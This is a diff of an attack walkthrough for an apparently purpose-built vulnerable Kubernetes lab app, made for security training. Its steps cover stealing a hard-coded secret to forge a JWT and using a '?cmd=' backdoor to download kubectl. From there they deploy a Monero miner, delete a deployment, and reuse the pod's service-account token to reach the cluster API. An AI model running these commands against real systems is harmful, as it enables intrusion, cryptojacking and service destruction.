@@ -7,7 +7,7 @@ Application vulnerabilities can bring wide range of different entrypoints. In ad
 
 ## Attack
 - get the `SECRET_KEY`:
-  - either find the [leaked value](http://mock-emailx.seck8s.slurm.io/clusters/local/namespaces/vulnapp/deployments/images-api) in the exposed unprotected Dashboard
+  - either find the [leaked value](http://rus-vote.seck8s.slurm.io/clusters/local/namespaces/vulnapp/deployments/images-api) in the exposed unprotected Dashboard
   - or check the Git-blame to find the hard-coded secret in sources *vulnerability: [hard-coded credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*
 - register a test user in `auth-api`, get the JWT (with `user_role='user'`)
 - proceed to `images-api` with the JWT token, see the image (partially logged in)
@@ -28,30 +28,22 @@ Application vulnerabilities can bring wide range of different entrypoints. In ad
     ```
 - since the server is in Debug mode, it auto-reloads without restarting the pod
 - use the backdoor to install `kubectl`:
-  - ?cmd=apt-get+update
-  - ?cmd=apt-get+-y+install+curl
+  - `?cmd=apt-get+update`
+  - `?cmd=apt-get+-y+install+curl`
   - Next, from https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/:
-  - ?cmd=curl%20-LO%20%22https://dl.k8s.io/release/$(curl%20-L%20-s%20https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl%22
-  - ?cmd=install%20-o%20root%20-g%20root%20-m%200755%20kubectl%20/usr/local/bin/kubectl
-  - ?cmd=kubectl+get+all
-- now you can use kubectl configured to the workload's service account:
-    ```sh
-    # Deploy a miner
-    ?cmd=kubectl+apply+-f+images/monero-deployment.yaml
-    ?cmd=kubectl+get+all
-    ```
-- or shut down the cluster's payload (Deployment only, permitted by RBAC)
-    ```sh
-    ?cmd=kubectl+delete+deployment+auth-api
-    ```
+  - `?cmd=curl%20-LO%20%22https://dl.k8s.io/release/$(curl%20-L%20-s%20https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl%22`
+  - `?cmd=install%20-o%20root%20-g%20root%20-m%200755%20kubectl%20/usr/local/bin/kubectl`
+  - `?cmd=kubectl+get+all`
+- now you can use kubectl configured to the workload's service account (deploy a miner): `?cmd=kubectl+apply+-f+images/monero-deployment.yaml`
+- or shut down the cluster's payload (Deployment only, permitted by RBAC): `?cmd=kubectl+delete+deployment+auth-api`
 
 > Note: inside the pod, kubectl is authenticated to the pod's SA. However, you could save SA's `token` and `ca.crt` to your local machine and, knowing the Kube API public URI, you can acess it remotely:
-> `kubectl --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) <command>`
+> ```kubectl --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) <command>```
 
 
 ## Steps to reproduce
 
-1. Deploy [vulnerable-app/auth-api](vulnerable-app/auth-api) and [vulnerable-app/images-api](vulnerable-app/images-api)
+1. Deploy [vulnerable-app](vulnerable-app) (both `auth-api` and `images-api`)
 2. Go to [auth service](http://auth.vulnapp.seck8s.slurm.io/)
 3. Sign-up any user and login
 4. Get redirection to the [image service](https://images.vulnapp.seck8s.slurm.io/) with the greatest cat in the world :)
